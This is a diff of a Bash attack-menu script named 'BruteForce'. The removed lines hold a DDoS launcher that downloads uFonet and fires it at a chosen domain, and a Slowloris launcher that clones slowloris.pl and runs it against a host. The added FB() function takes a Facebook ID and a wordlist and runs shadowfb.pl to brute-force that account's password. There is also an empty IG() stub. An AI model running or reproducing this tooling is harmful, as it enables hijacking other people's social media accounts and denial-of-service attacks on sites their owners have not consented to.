@@ -47,14 +47,14 @@ printf '\033]2;BruteForce \a'
 PS3="BruteForce>> "
 
 ##################
-###START BOTNET###
-BotNet()
+#######START######
+FB()
 {
 echo "" && echo -e "$cyan"
-echo -n -e "  Please Enter A domain Exp, http://google.com or IP - "
-read Domain
-if [ -z "$Domain" ]; then
-		
+echo -n -e "  Please Enter A Facebook ID -$white "
+read id
+if [ -z "$id" ]; then
+		echo ""
  				echo -n -e $red"  Do you want exit?$cyan ( Yes / No ) : " ;tput sgr0
 					read back
 						if [ -z "$back" ]; then
@@ -68,87 +68,68 @@ if [ -z "$Domain" ]; then
 										elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
 												then
 												clear
-                                                attacker
+                                                BF
 		
 	fi
 fi
-		echo "" && echo -e "$cyan"
-		echo -e "  Checking uFonet .. "
-	cd tools
-	if [ ! -d "ufonet" ]; then
-		echo -e $red"  uFonet Not Found ! .. " && echo ""
-		echo -e "  Wait for downloading"
-		echo "" && sleep 2
-		wget --no-check-certificate https://sourceforge.net/projects/ufonet/files/latest/download
-		unzip "download" && rm download && clear
+		echo ""
+echo -e $white"  Make Sure Wordlist on /root/Desktop"
+echo ""
+echo -n -e "$cyan  Please Enter Your Wordlist Name -$white "
+read name
+if [ -z "$name" ]; then
+	echo ""	
+ 				echo -n -e $red"  Do you want exit?$cyan ( Yes / No ) : " ;tput sgr0
+					read back
+						if [ -z "$back" ]; then
+							exit
+							fi
+						if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
+												then
+													echo "" && echo -e $BlueF" [$white"*"$BlueF]$red  Exiting ..." && sleep 0.2
+                                                 	echo -e $BlueF" [$white"*"$BlueF]$red  GoodBye!"
+	                                                exit 0
+										elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
+												then
+												clear
+                                                BF
 	fi
-		if [ -d "ufonet" ]; then
-	echo ""
-		echo -e "  uFonet found" && echo ""
-		echo -e "     ...:$BlueF Attacking Now $cyan:..."
-	echo ""
-		cd ufonet
-		chmod 777 ufonet
-		./ufonet --download-zombies
-		./ufonet -a $Domain
-	else
-		echo "We have a problem ! sorry"
-	fi
+fi
+echo ""
+echo -e $yellow"                           ...:$red Please Wait $yellow:..."	
+echo "" && echo -e "$red" && sleep 0.5	
+perl shadowfb.pl $id /root/Desktop/$name
+echo "" && echo "" && sleep 0.5
+echo -n -e $red"  Do you want exit?$cyan ( Yes / No ) : " ;tput sgr0
+					read back
+						if [ -z "$back" ]; then
+							exit
+							fi
+						if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
+												then
+													echo "" && echo -e $BlueF" [$white"*"$BlueF]$red  Exiting ..." && sleep 0.2
+                                                 	echo -e $BlueF" [$white"*"$BlueF]$red  GoodBye!"
+	                                                exit 0
+										elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
+												then
+												clear
+                                                BF
+
+fi
+
 }
-####END BOTNET###
+#######END#######
 #################
 
 
 ##################
-##START SLOWLORIS#
-SlowLoris()
+######START#######
+IG()
 {
 		echo "" && echo -e "$cyan"
-				echo -n -e "  Please Enter A domain Exp, www.google.com or IP - "
-		read DOmain
-	if [ -z "$DOmain" ]; then
-		
- 				echo -n -e $red"  Do you want exit?$cyan ( Yes / No ) : " ;tput sgr0
-					read back
-						if [ -z "$back" ]; then
-							exit
-							fi
-						if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
-												then
-													echo "" && echo -e $BlueF" [$white"*"$BlueF]$red  Exiting ..." && sleep 0.2
-                                                 	echo -e $BlueF" [$white"*"$BlueF]$red  GoodBye!"
-	                                                exit 0
-										elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
-												then
-												clear
-                                                attacker
-		
-	fi
-fi
-		echo "" && echo -e "$cyan"
-			echo -e "  Checking Slowloris .. " && sleep 1
-		cd tools
-			if [ ! -f "slowloris.pl" ]; then
-			echo ""
-		echo -e "  slowloris.pl Not Found ! .. "
-		echo ""
-				echo -e "  Wait for downloading"
-				echo "" && sleep 1
-				git clone https://github.com/llaera/slowloris.pl
-		cd slowloris.pl
-		else
-				echo "" && echo -e "  Slowloris found" && echo ""
-				echo -e "     ...:$BlueF Attacking Now $cyan:..."
-		fi
-				if [ -e "slowloris.pl" ]; then
-		echo ""
-				perl slowloris.pl -dns $DOmain
-		else
-				echo "$red"
-				echo "  We have a problem ! sorry"
-		fi
+
 }
-##END SLOWLORIS##
+#######END#######
 #################
 
 
